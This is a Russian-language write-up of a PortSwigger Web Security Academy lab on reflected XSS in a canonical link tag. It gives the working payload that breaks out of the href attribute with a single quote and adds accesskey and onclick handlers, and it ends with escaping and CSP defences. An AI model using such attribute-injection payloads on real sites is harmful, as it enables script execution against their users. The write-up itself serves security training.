# Reflected XSS in Canonical Link Tag  

**Платформа:** PortSwigger Web Security Academy  
**Категория:** Cross-Site Scripting (XSS)  
**Сложность:** Practitioner  
**Дата:** 2025-07-08  

---

## TL;DR

Приложение отражает ввод внутри атрибута `href` тега `<link rel="canonical">`.
Угловые скобки экранируются, но одиночная кавычка — нет. Это позволяет
выйти из контекста атрибута и внедрить `accesskey` + `onclick` для выполнения JS.

---

## Описание уязвимости

Пользовательский ввод подставляется напрямую в атрибут `href` канонической ссылки:

```html
<link rel="canonical" href="https://example.com/?search=ВВОД">
```

Угловые скобки экранированы → новые теги внедрить нельзя.
Одиночная кавычка не экранирована → можно выйти из контекста атрибута
и добавить произвольные HTML-атрибуты существующему тегу.

---

## Разведка

### Проверка классического payload
В адресную строку браузера вставила:

```
https://target.com/?search=<script>alert(1)</script>
```

Через DevTools (F12 → Elements) проверила как ввод отобразился в DOM —
угловые скобки экранированы, тег не сработал.

![Экранирование угловых скобок в DOM](./images/17-01-script-escaped.png)
---

## Эксплуатация

### Шаг 1 — Выход из контекста атрибута

Одиночная кавычка закрывает значение `href`, после чего можно добавлять
новые атрибуты:
```
'accesskey='x'onclick='alert(1)
```

Payload вставлялся напрямую в адресную строку браузера
```
https://target.com/?search='accesskey='x'onclick='alert(1)
```

Что получается в DOM:
```html
<link rel="canonical" href="'" accesskey="x" onclick="alert(1)">
```

![Payload в адресной строке браузера](./images/17-02-payload.png)

### Шаг 2 — Активация через горячую клавишу

`accesskey="x"` назначает элементу клавишу быстрого доступа.
При нажатии комбинации браузер активирует элемент → срабатывает `onclick`.

| ОС | Комбинация |
|---|---|
| Windows | `Alt + Shift + X` |
| macOS | `Ctrl + Alt + X` |
| Linux | `Alt + X` |

### Шаг 3 — Результат

После нажатия комбинации выполнился `alert(1)`.

![Успешный alert](./images/17-03-alert.png)

---

## Почему сработало

Обычный XSS:     внедряем новый тег  → <script>alert(1)</script>
заблокировано экранированием угловых скобок
Эта атака:       остаёмся в существующем теге <link>
выходим из атрибута через '
добавляем свои атрибуты accesskey + onclick
угловые скобки не нужны вообще

---

## Итог

Экранирование угловых скобок не защищает если пользовательский ввод
находится внутри значения атрибута — достаточно не экранированной
одиночной кавычки чтобы выйти из контекста и выполнить JS.

## Защита

```python
# Серверная сторона — экранировать ВСЕ спецсимволы в атрибутах:
# ' → &#x27;
# " → &quot;
# < → &lt;
# > → &gt;

# Пример на Python:
from html import escape
safe_url = escape(user_input, quote=True)  # quote=True экранирует кавычки
```

Дополнительно:
- CSP-заголовок ограничивает выполнение inline JS
- Не подставлять пользовательский ввод в атрибуты напрямую
